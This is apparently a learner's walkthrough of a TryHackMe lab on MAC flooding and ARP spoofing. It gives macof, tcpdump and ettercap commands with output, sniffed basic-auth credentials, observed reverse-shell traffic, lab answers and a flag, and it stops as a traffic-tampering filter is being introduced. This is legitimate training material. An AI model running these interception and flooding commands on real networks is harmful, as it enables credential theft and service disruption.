## Getting Started

While it's not required, ideally, you should have a general understanding of OSI Model [Layer 2](https://en.wikipedia.org/wiki/Data_link_layer) (L2) [network switches](https://en.wikipedia.org/wiki/Network_switch) work, what a [MAC table](https://en.wikipedia.org/wiki/MAC_table) is, what the Address Resolution Protocol ([ARP](https://en.wikipedia.org/wiki/Address_Resolution_Protocol)) does, and how to use Wireshark at a basic level. If you're not comfortable with these topics, please check out the [Network](https://tryhackme.com/module/network-fundamentals) and [Linux](https://tryhackme.com/module/linux-fundamentals) Fundamentals modules and [Wireshark](https://tryhackme.com/room/wireshark) room. ^00a9fa

> **“L2”** means **Layer 2**  
> This refers to the **Data Link Layer** of the OSI model. At this layer, devices communicate using **MAC addresses** (hardware addresses).
<div align="center">
<br>
<br>
</div>

### MAC Flooding

==DEF-MAC Flooding is an attack where an attacker floods a network switch with a large number of fake MAC addresses.==

**Why it works:**  
A switch uses a **MAC address table (CAM table)** to remember which MAC addresses are reachable on which physical ports. When the table is full, the switch can’t keep track anymore.

**Result:**  
The switch acts like a hub — it sends all traffic to all ports. This allows the attacker to **sniff network traffic** that wasn’t meant for them.
<div align="center">
<br>
<br>
</div>

### ARP Spoofing

ARP stands for **Address Resolution Protocol**. It maps IP addresses to MAC addresses inside a local network.

==DEF-ARP Spoofing (or ARP Poisoning) is a network attack where an attacker sends **forged ARP (Address Resolution Protocol) messages** onto a local area network (LAN) to **associate their MAC address with the IP address of another device**, like the default gateway or another host.==

**How the attack works:**  
An attacker sends fake ARP messages on the network. For example, they can say: _“Hey everyone, the gateway’s IP address is actually my MAC address!”_  
Devices believe it — so they send their traffic to the attacker instead of the real router.

**Result:**  
The attacker performs a **Man-in-the-Middle (MITM)** attack. They can:
- Read network traffic
- Modify it
- Steal credentials, cookies, etc.
<div align="center">
<br>
<br>
</div>

### How they work together

In practice:
- **MAC Flooding** is used to make the switch forward all packets to all ports.
- **ARP Spoofing** poisons the network’s IP-MAC relationships so traffic is rerouted through the attacker’s machine.

Both techniques help attackers sniff or manipulate network data inside a **local network** (like a LAN).
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Initial Access

_For the sake of this room, let's assume the following:_

While conducting a pentest, you have gained initial access to a network and escalated privileges to root on a Linux machine. During your routine OS enumeration, you realize it's a [dual-homed](https://en.wikipedia.org/wiki/Dual-homed) host, meaning it is connected to two (or more) networks. Being the curious hacker you are, you decided to explore this network to see if you can move laterally.

After having established **persistence**, you can access the compromised host via **SSH**:

| **User** | **Password** | **IP**       | **Port** |
| -------- | ------------ | ------------ | -------- |
| admin    | Layer2       | 10.10.244.13 | 22       |

`ssh -o StrictHostKeyChecking=accept-new admin@10.10.244.13`

Note: The **admin** user is in the **sudo** group. I suggest using the **root** user to complete this room: `sudo su -`

### Questions

##### Now, can you (re)gain access? (Yay/Nay)
Yay

![[Pasted image 20250709192004.png]]
![[Pasted image 20250709192258.png]]
![[Pasted image 20250709192515.png]]
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Network Discovery

As mentioned previously, the host is connected to one or more additional networks. You are currently connected to the machine via SSH on Ethernet adapter **eth0**. The network of interest is connected with Ethernet adapter **eth1**.

First, have a look at the adapter:  

`ip address show eth1` or the shorthand version: `ip a s eth1`

Using this knowledge, answer questions **#1** and **#2**.

Now, use the network enumeration tool of your choice, e.g., **ping**, a bash or python script, or Nmap (pre-installed) to discover other hosts in the network and answer question **#3**.

### Questions

##### What is your IP address?  
192.168.12.66

![[Pasted image 20250710092612.png]]

##### What's the network's CIDR prefix?  
/24 

![[Pasted image 20250710092720.png]]

##### How many other live hosts are there?  
2

![[Pasted image 20250710093322.png]]

##### What's the hostname of the first host (lowest IP address) you've found?
alice

![[Pasted image 20250710093909.png]]
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Passive Network Sniffing

Simply scanning those hosts won't help us gather any useful information, and you may be asking, what could a pentester do in this situation? Depending on the **rules of engagement** and **scope**, you could try **sniffing** traffic on this network.

The diagram below describes your current situation where you are the **Attacker** and have persistent access to **eve.**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e9955140ab79a04b28162eb/room-content/f19dfb6c3e6771ba582f1994ca54648a.png)  

Let's try running **tcpdump** on the **eth1** network interface:

`tcpdump -i eth1`

Optionally, for a more verbose output that prints each packet (minus its link level header) in ASCII format:

`tcpdump -A -i eth1   `

Try to answer questions **#1** through **#2**.  

Now, let's take a closer look at the captured packets! We can redirect them into a **pcap** file providing a destination file via the **-w** argument:

`tcpdump -A -i eth1 -w /tmp/tcpdump.pcap`

Capture traffic for about a minute, then transfer the pcap to either your machine or the AttackBox to open it in Wireshark.

Example to transfer the packet capture using **scp** and open it in Wireshark:

`scp admin@10.10.37.150:/tmp/tcpdump.pcap .`
`wireshark tcpdump.pcap`

Now, you should be able to answer questions **#3** and **#4**.

Note: If you receive an error "tcpdump: /tmp/tcpdump.pcap: Permission denied" and cannot overwrite the existing **/tmp/tcpdump.pcap** file, specify a new filename such as tcpdump**2**.pcap, or run `rm -f /tmp/*.pcap` then re-run **tcpdump**.
<div align="center">
<br>
<br>
</div>

### Questions

##### Can you see any traffic from those hosts? (Yay/Nay)
Yay

![[Pasted image 20250710102538.png]]
<div align="center">
<br>
</div>

##### Who keeps sending packets to eve?
bob

![[Pasted image 20250710102652.png]]
<div align="center">
<br>
</div>

##### What type of packets are sent?
ICMP

![[Pasted image 20250710102758.png]]
<div align="center">
<br>
</div>

##### What's the size of their data section? (bytes)
666

![[Pasted image 20250710111450.png]]
![[Pasted image 20250710111544.png]]
![[Pasted image 20250710111853.png]]
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Sniffing while MAC Flooding

Unfortunately, we weren't able to capture any interesting traffic so far. However, we're not going to give up this easily! So, how can we capture more network traffic? As mentioned in the room description, we could try to launch a [MAC flooding](https://en.wikipedia.org/wiki/MAC_flooding) attack against the L2-Switch.

**Beware:** MAC flooding could trigger an alarm in a SOC. No, seriously, suspicious layer 2 traffic can easily be detected and reported by state-of-the-art and properly configured network devices. Even worse, your network port could even get blocked by the network device altogether, rendering your machine locked out of the network. In case of production services running on or production traffic being routed through that network connection, this could even result in an effective **Denial-of-Service**!

However, if we're successful, the switch will resort to fail-open mode and temporarily operate similarly to a network hub – forwarding all received frames to every connected port (aside from the port the traffic originated from). This would allow an adversary or pentester to sniff the network traffic between other hosts that normally wouldn't be received by their device if the switch were functioning properly.  

Considering such an attack vector is only recommended when you have reasons to believe that…

- It is in fact a switched network (and not a virtual bridge) **AND**  
- The switch might be a consumer or prosumer (unmanaged) switch **OR** the network admins haven't configured mitigations such as Dynamic ARP Inspection (DAI) for instance **AND**
- ARP and MAC spoofing attacks are explicitly permitted in the **rules of engagement**. When in doubt, clarify with your client first!  

_Anyhow, let's assume you've met the well-thought decision to give it a try._

For better usability, open a second SSH session. This way, you can leave the **tcpdump** process running in the foreground on the first SSH session:

`tcpdump -A -i eth1 -w /tmp/tcpdump2.pcap`

Now, on the second SSH session, buckle up and let **[macof](http://manpages.ubuntu.com/manpages/bionic/man8/macof.8.html)** run against the interface to start flooding the switch:  

`macof -i eth1`

After around 30 seconds, stop both **macof** and **tcpdump** (Ctrl+C).

As in the previous task, transfer the **pcap** to your machine (**kali/AttackBox)** and take a look:

`scp admin@10.10.37.150:/tmp/tcpdump2.pcap .   wireshark tcpdump2.pcap   `

Now, you should be able to answer questions **#1** and **#2**.

**Note:** If it didn't work, try to capture for 30 seconds, again (while **macof** is running).  
If it still won't work, give it one last try with a capture duration of one minute.  
As the measure of last resort, try using **[ettercap](https://www.kali.org/tools/ettercap/)** (introduced in the following tasks) with the **rand_flood** plugin:

`ettercap -T -i eth1 -P rand_flood -q -w /tmp/tcpdump3.pcap` (Quit with **q**)
<div align="center">
<br>
<br>
</div>

### Questions

##### What kind of packets is Alice continuously sending to Bob?

Start by turning on the tcpdump listening mode, and don’t forget to also write the output to a new .pcap file called “tcpdump2.pcap” and save it to the /tmp/ directory.

```shell
admin@eve:~$ sudo tcpdump -A -i eth1 -w /tmp/tcpdump2.pcap
[sudo] password for admin:
tcpdump: listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes
^C212604 packets captured
212604 packets received by filter
0 packets dropped by kernel
```

Then open up a second SSH session, and type in the following command to start the MAC flooding attack.

```shell
admin@eve:~$ sudo macof -i eth1
e8:46:e9:68:34:52 b3:4b:8b:17:de:cb 0.0.0.0.18602 > 0.0.0.0.46920: S 1041758322:1041758322(0) win 512
5b:27:3b:69:69:9e ac:b3:12:41:3b:0 0.0.0.0.56708 > 0.0.0.0.37201: S 1765967874:1765967874(0) win 512
d3:59:88:27:b2:6d a0:a3:bd:2:89:e5 0.0.0.0.40940 > 0.0.0.0.64003: S 566850551:566850551(0) win 512
42:42:db:42:91:c5 e9:b9:b:11:5c:e8 0.0.0.0.47620 > 0.0.0.0.55834: S 1131137431:1131137431(0) win 512
21:a5:6b:11:99:1d 86:3f:73:4f:4b:ab 0.0.0.0.62345 > 0.0.0.0.64345: S 1442383875:1442383875(0) win 512
ba:f2:fc:1a:57:df ef:99:91:38:15:b4 0.0.0.0.11081 > 0.0.0.0.25805: S 352541912:352541912(0) win 512
bc:f3:d1:69:f8:f6 8b:33:11:53:83:28 0.0.0.0.32317 > 0.0.0.0.6491: S 1953037759:1953037759(0) win 512
56:86:94:3:b4:a8 46:e3:93:45:e4:18 0.0.0.0.58766 > 0.0.0.0.18314: S 1669684867:1669684867(0) win 512
e1:53:77:58:bf:cf e6:1d:fc:4:d8:fe 0.0.0.0.63151 > 0.0.0.0.12062: S 1873829088:1873829088(0) win 512
f8:64:30:b:1e:aa 5e:8a:26:55:c4:f6 0.0.0.0.36561 > 0.0.0.0.20703: S 1129092328:1129092328(0) win 512
52:19:ce:42:1f:62 a:dc:a3:4d:fa:4 0.0.0.0.52136 > 0.0.0.0.57489: S 163232637:163232637(0) win 512
37:51:e5:52:90:71 82:77:ef:65:fe:c6 0.0.0.0.44737 > 0.0.0.0.59161: S 1157516135:1157516135(0) win 512
...
^C
```

After around 30 seconds, stop both macof and tcpdump (Ctrl+C). As in the previous task, transfer the pcap file from the remote server to your local machine.

```shell
root@ip-10-10-245-92:~# scp admin@10.10.139.235:/tmp/tcpdump2.pcap .
admin@10.10.139.235's password:
tcpdump2.pcap                            100%   14MB 122.0MB/s   00:00
```

```shell
┌──(mopsy㉿APHP)-[~/THM]
└─$ scp root@54.216.59.129:/root/tcpdump2.pcap .
root@54.216.59.129's password:
tcpdump2.pcap                            100%   14MB   2.4MB/s   00:05
```

The next step is to open up the .pcap file with Wireshark.

```shell
┌──(mopsy㉿APHP)-[~/THM]
└─$ wireshark tcpdump2.pcap
```

This question is asking for the kind of packets Alice is continuously sending to Bob. You can’t find either Alice or Bob in the .pcap file so it is important to go back to the diagram in task 4 to find their IP addresses first. Alice’s IP is 192.168.12.1 and Bob’s IP is 192.168.12.2.

With this information in mind, you can do a quick filter to look for packets with source IP address being Alice’s IP which is 192.168.12.1. Answer is under the “protocol” column.

![[Pasted image 20250806082715.png]]
<div align="center">
<br>
</div>

##### What's the size of their data section? (bytes)
You can find this information by clicking into one of the entries. When you see the new pop-up window, go straight to the “Internet Control Message Protocol” and you’ll see “Data (1337 bytes)” which is the answer.

![[Pasted image 20250806083351.png]]
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Man-in-the-Middle: Intro to ARP Spoofing

As you may have noticed, MAC Flooding can be considered a real "noisy" technique. In order to reduce the risk of detection and DoS we will leave **macof** aside for now. Instead, we are going to perform so-called **ARP cache poisoning** attacks against Alice and Bob, in an attempt to become a fully-fledged [Man-in-the-Middle](https://en.wikipedia.org/wiki/Man-in-the-middle_attack) (MITM).

For a deeper understanding of this technique, read the Wikipedia article on [ARP spoofing](https://en.wikipedia.org/wiki/ARP_spoofing).

_**tl;dr –** "an attacker sends (spoofed) ARP messages […] to associate the attacker's MAC address with the IP address of another host […] causing any traffic meant for that IP address to be sent to the attacker instead. ARP spoofing may allow an attacker to **intercept** data frames on a network, **modify** the traffic, or stop all traffic. Often the attack is used as an opening for other attacks, such as denial of service, **man in the middle**, or session hijacking attacks."_ _-_ [_Wikipedia - ARP spoofing_](https://en.wikipedia.org/wiki/ARP_spoofing)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e9955140ab79a04b28162eb/room-content/53adfdaeec3bdfa65af7b1342cc77c2c.png)  

_[https://commons.wikimedia.org/wiki/File:ARP_Spfing.svg](https://commons.wikimedia.org/wiki/File:ARP_Spoofing.svg)_  

There are, however, measures and controls available to detect and prevent such attacks. In the current scenario, both hosts are running an ARP implementation that takes pains to validate incoming ARP replies. Without further ado, we are using **ettercap** to launch an ARP Spoofing attack against Alice and Bob and see how they react:

`ettercap -T -i eth1 -M arp`
<div align="center">
<br>
<br>
</div>

### Questions

##### Can ettercap establish a MITM in between Alice and Bob? (Yay/Nay)
Nay

The **“ettercap”** command is another great tool that you might want to keep in your arsenal. It is primarily used for network analysis and penetration testing. In the following command, by specifying **“-M arp”** you are carrying out an ARP poisoning attacks on the target network (which is eth1 in this case).

However, as the room instructions alluded to, the hosts (Alice and Bob) have their **ARP implementation** running. In another words, they are implementing **security measures to verify the authenticity** and correctness of ARP replies they receive. Therefore, it will be very challenging for attackers to successfully carry out ARP spoofing attacks in this scenario. As you can see from the below output, no legitimate connections among the these hosts have been established or no packets have been sent back and forth (note that the **packet size is always “0”**)

```shell
admin@eve:~$ sudo ettercap -T -i eth1 -M arp
[sudo] password for admin: 

ettercap 0.8.3 copyright 2001-2019 Ettercap Development Team

Listening on:
  eth1 -> D2:51:5E:A8:DE:FF
	  192.168.12.66/255.255.255.0
	  fe80::f054:e7ff:fe2c:3a69/64

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use_tempaddr is not set to 0.
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  57 ports monitored
24609 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts...
/ |======================>                            |  42.75 %

Wed Aug  6 07:04:20 2025 [935468]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Wed Aug  6 07:04:20 2025 [935497]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)
* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : ANY (all the hosts in the list)

 GROUP 2 : ANY (all the hosts in the list)
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help



Wed Aug  6 07:04:23 2025 [469628]
  192.168.12.2:0 --> 192.168.12.1:0 |  (0)


Wed Aug  6 07:04:23 2025 [469645]
  192.168.12.1:0 --> 192.168.12.2:0 |  (0)


Wed Aug  6 07:04:23 2025 [480102]
  192.168.12.2:0 --> 192.168.12.1:0 |  (0)


Wed Aug  6 07:04:23 2025 [480141]
  192.168.12.1:0 --> 192.168.12.2:0 |  (0)


Wed Aug  6 07:04:23 2025 [936740]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Wed Aug  6 07:04:23 2025 [936798]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Wed Aug  6 07:04:26 2025 [937912]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Wed Aug  6 07:04:26 2025 [937968]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Wed Aug  6 07:04:29 2025 [939319]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Wed Aug  6 07:04:29 2025 [939371]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Wed Aug  6 07:04:32 2025 [940480]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Wed Aug  6 07:04:32 2025 [940510]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Wed Aug  6 07:04:35 2025 [941705]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Wed Aug  6 07:04:35 2025 [941757]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Wed Aug  6 07:04:38 2025 [942945]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Wed Aug  6 07:04:38 2025 [942974]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Wed Aug  6 07:04:41 2025 [944094]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Wed Aug  6 07:04:41 2025 [944152]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Wed Aug  6 07:04:44 2025 [945491]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Wed Aug  6 07:04:44 2025 [945536]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Wed Aug  6 07:04:47 2025 [946728]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Wed Aug  6 07:04:47 2025 [946804]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)



User requested a CTRL+C... (deprecated, next time use proper shutdown)



Wed Aug  6 07:04:50 2025 [947885]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Wed Aug  6 07:04:50 2025 [947915]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)
admin@eve:~$ 

```
<div align="center">
<br>
</div>

##### Would you expect a different result when attacking hosts without ARP packet validation enabled? (Yay/Nay)
Yay

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

<div align="center">
<br>
<br>
</div>

## 7. Man-in-the-Middle: Sniffing

In this somewhat altered scenario, Alice and Bob are running a different OS (Ubuntu) with its default ARP implementation and no protective controls on their machines. As in the previous task, try to establish a MITM using **ettercap** and see if Ubuntu (by default) is falling prey to it.

After starting the VM attached to this task, you can log on via SSH with the same credentials as before:

Username: **admin**  
Password: **Layer2**

_As with the previous machine, please, also allow a minimum of **5 minutes** for this box to spin up, **then** try connecting with SSH (if you login, and the command line isn't showing up yet, **don't hit Ctrl+C!** Just be patient…)_
<div align="center">
<br>
<br>
</div>

### Questions

##### Scan the network on eth1. Who's there? Enter their IP addresses in ascending order.
192.168.12.10, 192.168.12.20

First of all, I need to know the IP subnet range for eth1. After entering the following command, I can see the IP subnet for eth1 is “192.168.12.66/24”.

```shell
admin@eve:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 02:cd:f2:a9:74:75 brd ff:ff:ff:ff:ff:ff
    inet 10.10.192.5/16 brd 10.10.255.255 scope global dynamic ens5
       valid_lft 3521sec preferred_lft 3521sec
    inet6 fe80::cd:f2ff:fea9:7475/64 scope link 
       valid_lft forever preferred_lft forever
3: virbr0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default qlen 1000
    link/ether 52:54:00:8a:e8:c5 brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
       valid_lft forever preferred_lft forever
4: virbr0-nic: <BROADCAST,MULTICAST> mtu 1500 qdisc fq_codel master virbr0 state DOWN group default qlen 1000
    link/ether 52:54:00:8a:e8:c5 brd ff:ff:ff:ff:ff:ff
5: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether d2:51:5e:a8:de:ff brd ff:ff:ff:ff:ff:ff
    inet 192.168.12.66/24 brd 192.168.12.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::f054:e7ff:fe2c:3a69/64 scope link 
       valid_lft forever preferred_lft forever
6: gns3tap0-1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel master eth1 state UNKNOWN group default qlen 1000
    link/ether d2:51:5e:a8:de:ff brd ff:ff:ff:ff:ff:ff
    inet6 fe80::d051:5eff:fea8:deff/64 scope link 
       valid_lft forever preferred_lft forever
```

With this information in mind, I can use nmap to scan the live hosts in this subnet. There are 3 hosts up including Slice, Bob, and Eve (as expected).

```shell
admin@eve:~$ sudo nmap 192.168.12.66/24
[sudo] password for admin: 
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-06 09:10 UTC
Nmap scan report for alice (192.168.12.10)
Host is up (0.0015s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
4444/tcp open  krb524
MAC Address: 72:5B:FE:38:32:91 (Unknown)

Nmap scan report for bob (192.168.12.20)
Host is up (0.0014s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: AA:0E:D9:63:95:03 (Unknown)

Nmap scan report for eve (192.168.12.66)
Host is up (0.0000050s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
5002/tcp open  rfe

Nmap done: 256 IP addresses (3 hosts up) scanned in 2.28 seconds
```
<div align="center">
<br>
</div>

##### Which machine has an open well-known port?
192.168.12.20
<div align="center">
<br>
</div>

##### What is the port number?
80
<div align="center">
<br>
</div>

##### Can you access the content behind the service from your current position? (Nay/Yay)
Nay
<div align="center">
<br>
</div>

##### Can you see any meaningful traffic to or from that port passively sniffing on you interface eth1? (Nay/Yay)
Nay

```shell
admin@eve:~$ sudo tcpdump -vvA -i eth1
tcpdump: listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes
^C
0 packets captured
0 packets received by filter
0 packets dropped by kernel
```
<div align="center">
<br>
</div>

##### Now launch the same ARP spoofing attack as in the previous task. Can you see some interesting traffic, now? (Nay/Yay)

```shell
admin@eve:~$ sudo ettercap -T -i eth1 -M arp

ettercap 0.8.3 copyright 2001-2019 Ettercap Development Team

Listening on:
  eth1 -> 56:E0:12:75:87:7C
          192.168.12.66/255.255.255.0
          fe80::ac9f:c3ff:fe39:55db/64

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use_tempaddr is not set to 0.
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  57 ports monitored
24609 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts...
* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : ANY (all the hosts in the list)

 GROUP 2 : ANY (all the hosts in the list)
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help
...
```
<div align="center">
<br>
</div>

##### Who is using that service?
Alice

```shell
Wed Aug  6 09:22:11 2025 [860413]
  192.168.12.10:0 --> 192.168.12.20:0 |  (0)


Wed Aug  6 09:22:11 2025 [860488]
  192.168.12.20:0 --> 192.168.12.10:0 |  (0)


Wed Aug  6 09:22:12 2025 [87649]
TCP  192.168.12.10:4444 --> 192.168.12.20:45778 | AP (7)
whoami


Wed Aug  6 09:22:12 2025 [92128]
TCP  192.168.12.20:45778 --> 192.168.12.10:4444 | AP (5)
root


Wed Aug  6 09:22:12 2025 [99303]
TCP  192.168.12.10:4444 --> 192.168.12.20:45778 | A (0)


Wed Aug  6 09:22:13 2025 [222904]
TCP  192.168.12.20:45782 --> 192.168.12.10:4444 | S (0)


Wed Aug  6 09:22:13 2025 [227383]
TCP  192.168.12.10:4444 --> 192.168.12.20:45782 | SA (0)


Wed Aug  6 09:22:13 2025 [235816]
TCP  192.168.12.20:45782 --> 192.168.12.10:4444 | A (0)


Wed Aug  6 09:22:13 2025 [251582]
TCP  192.168.12.10:4444 --> 192.168.12.20:45782 | AP (7)
whoami


Wed Aug  6 09:22:13 2025 [259325]
TCP  192.168.12.20:45782 --> 192.168.12.10:4444 | A (0)


Wed Aug  6 09:22:13 2025 [260523]
TCP  192.168.12.20:45782 --> 192.168.12.10:4444 | AP (5)
root
```
<div align="center">
<br>
</div>

##### What's the hostname the requests are sent to?
www.server.bob

```shell
Wed Aug  6 09:22:21 2025 [756157]
HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt
TCP  192.168.12.10:36996 --> 192.168.12.20:80 | AP (133)
GET /test.txt HTTP/1.1.
Host: www.server.bob.
Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
User-Agent: curl/7.68.0.
Accept: */*.
.
```
<div align="center">
<br>
</div>

##### Which file is being requested?
test.txt
<div align="center">
<br>
</div>

##### What text is in the file?
OK

```shell
Wed Aug  6 09:22:45 2025 [845533]
TCP  192.168.12.20:80 --> 192.168.12.10:37004 | FAP (171)
Server: SimpleHTTP/0.6 Python/2.7.12.
Date: Wed, 06 Aug 2025 09:22:45 GMT.
Content-type: text/plain.
Content-Length: 3.
Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
.
OK
```
<div align="center">
<br>
</div>

##### Which credentials are being used for authentication? (username:password)

```shell
Wed Aug  6 09:22:45 2025 [835776]
TCP  192.168.12.10:37004 --> 192.168.12.20:80 | AP (133)
GET /test.txt HTTP/1.1.
Host: www.server.bob.
Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
User-Agent: curl/7.68.0.
Accept: */*.
.
HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt

```
<div align="center">
<br>
</div>

##### Now, stop the attack (by pressing q). What is ettercap doing in order to leave its man-in-the-middle position gracefully and undo the poisoning?
RE-ARPing the victims

```shell
Terminating ettercap...
Lua cleanup complete!
ARP poisoner deactivated.
RE-ARPing the victims...
Unified sniffing was stopped.
```
<div align="center">
<br>
</div>

##### Can you access the content behind that service, now, using the obtained credentials? (Nay/Yay)
Yay

```shell
admin@eve:~$ curl -u admin:s3cr3t_P4zz http://192.168.12.20/
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html>
<title>Directory listing for /</title>
<body>
<h2>Directory listing for /</h2>
<hr>
<ul>
<li><a href="SimpleHTTPAuthServer.py">SimpleHTTPAuthServer.py</a>
<li><a href="test.txt">test.txt</a>
<li><a href="user.txt">user.txt</a>
</ul>
<hr>
</body>
</html>

```
<div align="center">
<br>
</div>

##### What is the user.txt flag?
THM{wh0s_$n!ff1ng_0ur_cr3ds}

```shell
admin@eve:~$ curl -u admin:s3cr3t_P4zz http://192.168.12.20/user.txt -o /tmp/user.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    29  100    29    0     0   1705      0 --:--:-- --:--:-- --:--:--  1812
admin@eve:~$ cat /tmp/user.txt 
THM{wh0s_$n!ff1ng_0ur_cr3ds}
```
<div align="center">
<br>
</div>

##### You should also have seen some  rather questionable kind of traffic. What kind of remote access (shell) does Alice have on the server?
reverse shell
<div align="center">
<br>
</div>

##### What commands are being executed? Answer in the order they are being executed.
whoami, pwd, ls

```shell
Wed Aug  6 12:36:11 2025 [705515]
TCP  192.168.12.10:4444 --> 192.168.12.20:47842 | AP (7)
whoami

Wed Aug  6 12:36:14 2025 [734019]
TCP  192.168.12.10:4444 --> 192.168.12.20:47838 | AP (4)
pwd

Wed Aug  6 12:36:18 2025 [735410]
TCP  192.168.12.10:4444 --> 192.168.12.20:47838 | AP (3)
ls
```
<div align="center">
<br>
</div>

##### Which of the listed files do you want?
root.txt
<div align="center">
<br>
</div>

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 8. Man-in-the-Middle: Manipulation

As a pentester, your first approach would be to try to hack Bob's web server. For the purpose of this room, let's assume it's impossible. Also, capturing basic auth credentials won't help for password reuse or similar attacks.  

So, let's advance our ongoing ARP poisoning attack into a fully-fledged MITM that includes packet manipulation! As Alice's packets pass through your attacker machine (**eve**), we can tamper with them.

How can we go about doing this? Ettercap comes with an `-F` option that allows you to apply filters in the form of specified **etterfilter.ef** files for the session. These **.ef** files, however, have to be compiled from **etterfilter** source filter files (**.ecf**) first. Their source code syntax is similar to C code. To keep this task more beginner-friendly, we assume it won't matter if Alice detects our manipulation activities. For the sake of this room, we are only going to manipulate her commands and won't be taking any OPSEC precautions.

Which brave command of hers should volunteer for our audacious endeavor? How about… yes, whoami, of course!

Before you copy and paste the filter below, it's best to understand the **etterfilter** command and its source file syntax. Consult the man page by either running  `man etterfilter` or browsing the [linux.die.net/man/8/etterfilter](https://linux.die.net/man/8/etterfilter) page.  

Now, create a new etterfilter code file named **whoami.ecf** and try to write a filter matching Alice's source port and transport protocol as well as replacing **whoami** data with a reverse shell payload of your choice. To see the solution, click the dropdown arrow:

_Show possible solution (spoiler!)_  

In the end, your filter might look similar to this one, where **<reverse_shell>** contains the reverse shell payload you chose:  

